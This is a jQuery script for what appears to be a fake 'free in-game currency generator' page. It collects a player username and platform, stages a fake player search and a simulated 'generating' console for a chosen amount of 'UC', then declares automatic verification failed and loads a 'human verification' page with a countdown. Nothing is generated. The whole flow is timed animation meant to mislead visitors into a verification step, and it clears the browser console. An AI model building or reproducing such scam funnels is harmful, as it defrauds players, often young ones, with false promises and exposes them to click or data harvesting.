$(document).ready(function() {

    ////////////////
    // Searching for Player Messages
    //////////////// 
    var $searching_msg_1 = "Searching for";
    var $searching_msg_2 = "on";
    var $searching_msg_3 = "Player Found";

    ////////////////
    // Console Messages
    //////////////// 
    var $console_r_1 = "UC";
    var $console_msg_1 = "Loading...";
    var $console_msg_2 = "Prepearing to generate...";
    var $console_msg_3 = "Generating";
    var $console_msg_4 = "Succesfully generated";
    var $console_msg_5 = "Performing Verification...";
    var $console_msg_6 = "Automatic Verification Failed";
    var $console_msg_7 = "Please Verify Manually";

    ////////////////
    // Resource  Values
    //////////////// 
    var resource_1_value_min = 1000;
    var resource_1_value_max = 50000;
    var $resource_1_value_1 = '1000';
    var $resource_1_value_2 = '15000';
    var $resource_1_value_3 = '30000';
    var $resource_1_value_4 = '50000';

    ////////////////
    // Resource 2  Values
    //////////////// 
    var resource_2_value_min = 1000;
    var resource_2_value_max = 10000;
    var $resource_2_value_1 = '1000';
    var $resource_2_value_2 = '2500';
    var $resource_2_value_3 = '5000';
    var $resource_2_value_4 = '10000';

    // Human Verification Timer
    var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	

    // Sound Effects
    var $sound_setting = '1';
    ion.sound({
        sounds: [{
                name: "metalclick",
                path: "audio/",
                volume: 0.7
            },
            {
                name: "heartbeat",
                path: "audio/",
                loop: true,
                volume: 0.4
            },
            {
                name: "swoosh",
                path: "audio/",
                volume: 0.7
            },
            {
                name: "success",
                path: "audio/",
                volume: 0.7
            }
        ],
        path: "audio/",
        preload: true,
        multiplay: true
    });

    $('#input-player-username').on('focus click', function(e) {
        $('.input-background').addClass('animated jello inpFocused');
    });

    var console_username;
    $("#dugmic-1").click(function() {
        ion.sound.play("metalclick");
        if ($('#input-player-username').val().length <= 2) {
            $(".player-username-input-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                $(this).removeClass('shake animated');
            });
            $(".input-error-notice").addClass('now-seen animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                $(this).removeClass('animated bounceIn now-seen');
            });
        } else if ($('#input-player-username').val().length >= 2) {
            console_username = $('#input-player-username').val();
            countermind();

        }
    });
    $('#input-player-username').on('keypress', function(e) {
        ion.sound.play("metalclick");
        if (e.which === 13) {
            if ($('#input-player-username').val().length <= 2) {
                $(".player-username-input-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                    $(this).removeClass('shake animated');
                });
                $(".input-error-notice").addClass('now-seen animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                    $(this).removeClass('animated bounceIn now-seen');
                });
            } else if ($('#input-player-username').val().length >= 2) {
                console_username = $('#input-player-username').val();
                countermind();

            }
        }
    });

    function countermind() {
        ion.sound.play("swoosh");
        $(".gen-c").addClass('flipOutX animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
            $.ajax({
                type: "get",
                url: "parts/platform_s.php",
                success: function(dataprocess) {
                    $('.gen-c').html(dataprocess);
                    var selected_platform;

                    function fixplatformBox($platform_parent_class) {
                        resetplatformBoxes();
                        if ($platform_parent_class.hasClass('platform-1')) {
                            selected_platform = 'Android';
                        }
                        if ($platform_parent_class.hasClass('platform-2')) {
                            selected_platform = 'iOS';
                        }
                        if ($platform_parent_class.hasClass('platform-3')) {
                            selected_platform = 'Windows';
                        }
                        $platform_parent_class.addClass('active');
                        $platform_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                            $(this).removeClass('animated jello');
                        });
                    }

                    function resetplatformBoxes() {
                        var $platform_list = $('.platform-1, .platform-2, .platform-3');
                        if ($platform_list.hasClass('active')) {
                            $platform_list.removeClass('active');
                        }
                    }
                    $('.platform-item-inner-wrapper').click(function() {
                        fixplatformBox($(this));
                        ion.sound.play("metalclick");
                    });
                    $("#dugmic-2").click(function() {
                        ion.sound.play("metalclick");
                        if (typeof selected_platform == 'undefined') {
                            $(".platform-select-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                $(this).removeClass('shake animated');
                            });
                            $(".input-error-notice").addClass('now-seen animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                $(this).removeClass('animated bounceIn now-seen');
                            });
                        } else {
                            $.ajax({
                                type: "get",
                                url: "parts/searching_s.php",
                                success: function(dataprocess) {
                                    $('.330d').html(dataprocess);
                                    $.magnificPopup.open({
                                        items: {
                                            src: '#popup-wrapper',
                                        },
                                        type: 'inline',
                                        preloader: false,
                                        mainClass: 'animated slideInUp popup-bg',
                                        modal: true,
                                        callbacks: {
                                            beforeOpen: function() {
                                                ion.sound.play("swoosh");
                                            },
                                            open: function() {
                                                $(".section-gen").addClass('now-hidden');
                                                ion.sound.play("heartbeat")
                                                setTimeout(function() {
                                                    $('.searching-img img').addClass('searching');
                                                    $('.searching-msg').html($searching_msg_1 + ' <span>' + console_username + '</span> ' + $searching_msg_2 + ' <span>' + selected_platform + '</span>');

                                                }, 800);
                                                setTimeout(function() {
                                                    $('.searching-msg').removeClass('animated bounceIn animation-delay-1000');
                                                    $('.searching-img img').removeClass('animated bounceIn animation-delay-800');
                                                }, 2000);
                                                setTimeout(function() {
                                                    ion.sound.play("success");
                                                    $('.searching-msg').addClass('animated bounceIn');
                                                    $('.searching-img img').removeClass('searching');
                                                    $(".searching-img img").attr("src", "img/checkmark.png");
                                                    $('.searching-img img').addClass('animated bounceIn');
                                                    $('.searching-msg').html($searching_msg_3);
                                                }, 3800);
                                                setTimeout(function() {
                                                    $('.searching-wrapper').addClass('animated fadeOut');
                                                }, 5500);
                                                setTimeout(function() {
                                                    $.ajax({
                                                        type: "get",
                                                        url: "parts/resource_one_s.php",
                                                        success: function(dataprocess) {
                                                            ion.sound.pause("heartbeat")
                                                            $('.popup-wrapper').html(dataprocess);

                                                            function progressBar(percent, $element) {
                                                                var progressBarWidth = percent * $element.width() / 100;
                                                                $element.find('div').animate({
                                                                    width: progressBarWidth
                                                                }, 500).html(percent + "%&nbsp;");
                                                            }

                                                            $('#resource-val').html($resource_1_value_1);
                                                            progressBar(25, $('#progressBar'));

                                                            var select = $("#selected-amount-wrapper");
                                                            var slider = $("<div id='slider-resource-1'></div>").insertAfter(select).slider({
                                                                min: resource_1_value_min,
                                                                max: resource_1_value_max,
                                                                value: resource_1_value_min,
                                                                range: "min",
                                                                change: function(event, ui) {
                                                                    var sliderValue = $("#slider-resource-1").slider("option", "value");
                                                                    $('#resource-val').html(sliderValue);
                                                                    if (sliderValue == $resource_1_value_1) {
                                                                        progressBar(25, $('#progressBar'));
                                                                        $('#decrease-resource-1').addClass('resource-button-n-a');
                                                                    } else if (sliderValue == $resource_1_value_2) {
                                                                        progressBar(50, $('#progressBar'));
                                                                        $('#decrease-resource-1').removeClass('resource-button-n-a');
                                                                    } else if (sliderValue == $resource_1_value_3) {
                                                                        progressBar(75, $('#progressBar'));
                                                                        $('#increase-resource-1').removeClass('resource-button-n-a');
                                                                    } else if (sliderValue == $resource_1_value_4) {
                                                                        progressBar(100, $('#progressBar'));
                                                                        $('#increase-resource-1').addClass('resource-button-n-a');
                                                                    }
                                                                }
                                                            });
                                                            $('#increase-resource-1').click(function() {
                                                                var sliderCurrentValue = $("#slider-resource-1").slider("option", "value");

                                                                if (sliderCurrentValue == $resource_1_value_1) {
                                                                    slider.slider("value", $resource_1_value_2);
                                                                    ion.sound.play("metalclick");
                                                                }

                                                                if (sliderCurrentValue == $resource_1_value_2) {
                                                                    slider.slider("value", $resource_1_value_3);
                                                                    ion.sound.play("metalclick");
                                                                }

                                                                if (sliderCurrentValue == $resource_1_value_3) {
                                                                    slider.slider("value", $resource_1_value_4);
                                                                    ion.sound.play("metalclick");
                                                                }

                                                            });

                                                            $('#decrease-resource-1').click(function() {
                                                                var sliderCurrentValue = $("#slider-resource-1").slider("option", "value");
                                                                if (sliderCurrentValue == $resource_1_value_4) {
                                                                    slider.slider("value", $resource_1_value_3);
                                                                    ion.sound.play("metalclick");
                                                                }
                                                                if (sliderCurrentValue == $resource_1_value_3) {
                                                                    slider.slider("value", $resource_1_value_2);
                                                                    ion.sound.play("metalclick");
                                                                }
                                                                if (sliderCurrentValue == $resource_1_value_2) {
                                                                    slider.slider("value", $resource_1_value_1);
                                                                    ion.sound.play("metalclick");
                                                                }
                                                                if (sliderCurrentValue == $resource_1_value_1) {
                                                                    $('#decrease-resource-1').addClass('resource-button-n-a');
                                                                }
                                                            });
                                                            $('#dugmic-3').click(function() {
                                                                ion.sound.play("metalclick");
                                                                var $selected_amount = $('#slider-resource-1').slider("option", "value");
                                                                $('.animate-out').addClass('animated bounceOut');
                                                                setTimeout(function() {
                                                                    $.ajax({
                                                                        type: "get",
                                                                        url: "parts/console_s.php",
                                                                        success: function(dataprocess) {
                                                                            $('.popup-wrapper').html(dataprocess);
                                                                            ion.sound.pause("heartbeat")
                                                                            var $console_msg = ".console-msg";
                                                                            $($console_msg).html($console_msg_1);
                                                                            $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                $(this).removeClass('animated bounceIn');
                                                                            });
                                                                            setTimeout(function() {
                                                                                $($console_msg).html($console_msg_2);
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                            }, 2000);
                                                                            setTimeout(function() {
                                                                                $($console_msg).html($console_msg_3 + ' ' + $selected_amount + ' ' + $console_r_1);
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                                $(".cog-img-wrapper").fadeOut(function() {
                                                                                    $(".con-r1-gen").fadeIn(function() {
                                                                                        $('.con-r1-gen-val').countTo({
                                                                                            from: 0,
                                                                                            to: $selected_amount,
                                                                                            speed: 2500,
                                                                                            refreshInterval: 5,
                                                                                            formatter: function(value, options) {
                                                                                                return value.toFixed(options.decimals);
                                                                                            }
                                                                                        });
                                                                                    });
                                                                                });
                                                                            }, 4500);
                                                                            setTimeout(function() {
                                                                                $(".con-r1-gen").fadeOut(function() {
                                                                                    $(".cog-img-wrapper").fadeIn(function() {
                                                                                        ion.sound.play("success");
                                                                                        $('.cog-icon').removeClass('fa-spin');
                                                                                        $(".cog-icon").attr("src", "img/checkmark.png");
                                                                                    });
                                                                                });
                                                                                $($console_msg).html('<span class="console-msg-success">' + $console_msg_4 + '</span>');
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                            }, 8500);
                                                                            setTimeout(function() {
                                                                                $('.cog-icon').addClass('fa-spin');
                                                                                $(".cog-icon").attr("src", "img/cog.png");
                                                                                $($console_msg).html($console_msg_5);
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                            }, 11000);
                                                                            setTimeout(function() {
                                                                                $($console_msg).html('<span class="console-msg-error">' + $console_msg_6 + '</span>');
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                            }, 13000);
                                                                            setTimeout(function() {
                                                                                $($console_msg).html($console_msg_7);
                                                                                $($console_msg).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function() {
                                                                                    $(this).removeClass('animated bounceIn');
                                                                                });
                                                                            }, 15000);
                                                                            setTimeout(function() {
                                                                                $.ajax({
                                                                                    type: "get",
                                                                                    url: "parts/verification.php",
                                                                                    success: function(dataprocess) {
                                                                                        console.clear();
                                                                                        console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
                                                                                        $('.popup-wrapper').html(dataprocess).hide().fadeIn();
                                                                                        if ($sound_setting == 1) {
                                                                                            ion.sound.play("swoosh");
                                                                                        }
                                                                                        human_verification_timer.init($human_verification_timer_value);
                                                                                    }
                                                                                });
                                                                            }, 17500);
                                                                        }
                                                                    });
                                                                }, 1000);
                                                            });
                                                        }
                                                    });
                                                }, 6400);
                                            }
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            });
            $(this).removeClass('flipOutX animated');
            $(this).addClass('flipInX animated');
        });
    }
});

function rng(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);

}

function Random(_0xaa63x2, _0xaa63x3) {
    return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};
var human_verification_timer = function() {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';

    function countdown() {
        if (time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }

    function add_leading_zero(n) {
        if (n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }

    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);
        seconds = add_leading_zero(seconds);
        minutes = add_leading_zero(minutes);
        hours = add_leading_zero(hours);
        return minutes + ' minutes and ' + seconds + ' seconds';
    }

    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }

    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function() {
            countdown();
            timer_time_left();
        },
        timer: function() {
            human_verification_timer.count();
            if (keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function(n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();